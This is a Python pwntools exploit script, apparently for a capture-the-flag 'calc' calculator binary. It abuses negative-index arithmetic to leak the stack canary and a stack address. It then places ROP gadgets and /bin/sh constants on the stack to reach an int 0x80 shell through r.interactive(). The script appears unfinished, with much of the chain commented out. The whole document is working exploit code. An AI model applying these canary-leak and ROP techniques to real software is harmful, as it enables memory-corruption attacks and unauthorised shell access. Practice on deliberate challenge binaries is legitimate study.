from pwn import *


r = process("./calc")
## leak information leave stack using program bug
## if only input negative number, eval function will edit the number to negative length, leads to negative index to caculation array
## so we can leak information before caculation array 


'''
stack view of parse_expr

0xffffcc80│+0x0000: 0x00000000
0xffffcc84│+0x0004: 0x00000000
0xffffcc88│+0x0008: 0x00000000
0xffffcc8c│+0x000c: 0x63cd7400  : canary : index : -11
0xffffcc90│+0x0010: 0x00000000
0xffffcc94│+0x0014: 0x80481b0  →  <_init+0> push ebx
0xffffcc98│+0x0018: 0xffffd258    ← $ebp : index :-8
0xffffcc9c│+0x001c: 0x80493f2  →  <calc+121> test eax, eax
0xffffcca0│+0x0020: 0xffffce4c  →  "-5+5"
0xffffcca4│+0x0024: 0xffffccb8  →  0xfffffffc
0xffffcca8│+0x0028: 0x00000005
0xffffccac│+0x002c: 0x00000000
0xffffccb0│+0x0030: 0x00000000
0xffffccb4│+0x0034: 0x00000000  # index : -1 
0xffffccb8│+0x0038: 0xfffffffc  # length : index 0
0xffffccbc│+0x003c: 0x00000005
0xffffccc0│+0x0040: 0x00000000
0xffffccc4│+0x0044: 0x00000000
0xffffccc8│+0x0048: 0x00000000
0xffffcccc│+0x004c: 0x00000000
'''
### ROPgadget
nop_int_80 = 0x0807087f
pop_eax_ret = 0x0805c34b
pop_edx_pop_ecx_pop_ebx_ret = 0x80701d0
pop_ebx_ret = 0x80701d2
pop_ecx_ret = 0x080e6f71
pop_edx_ret = 0x080701aa
bin_sh_1 = 0x68732f2f
bin_sh_2 = 0x6e69622f

mov_ebp_esp_ret = 0x08048d4f

## leak canary  
r.sendlineafter('=== Welcome to SECPROG calculator ===\n',b'-11') 
canary = r.recv().strip()
canary = hex(int(canary.decode()) & (2**32-1))
log.info(f'canary : {canary}')

## leak stack base

r.sendline(b'-5')
stack_base =  int(r.recv().strip().decode())
stack_base_hex =  hex(stack_base  & (2**32-1))
log.info(f'stack base : {stack_base_hex}')

## rop

## -1+360 : calc ebp

input()
# r.sendline(b'-3+' + str(bin_sh_1).encode())
# r.sendline(b'-4+' + str(bin_sh_2).encode())


r.sendline(b'-1+361+' + str(pop_edx_pop_ecx_pop_ebx_ret).encode())
r.sendline(b'-1+365+' + str(pop_eax_ret).encode())
r.sendline(b'-5+5+5')
# r.sendline(b'-1+367+' + str(pop_edx_ret).encode())
# r.sendline(b'-1+369+' + str(pop_edx_ret).encode())
# r.sendline(b'-1+371+' + str(pop_edx_ret).encode())
# r.sendline(b'-1+369+' + str(pop_edx_pop_ecx_pop_ebx_ret).encode())
# r.sendline(b'-1+373+' + str(pop_edx_pop_ecx_pop_ebx_ret).encode())
# r.sendline(b'-1+377+' + str(pop_edx_pop_ecx_pop_ebx_ret).encode())
# r.sendline(b'-1+381+' + str(pop_edx_pop_ecx_pop_ebx_ret).encode())
# r.sendline(b'-1+384+' + str(pop_ebx_ret))

r.interactive()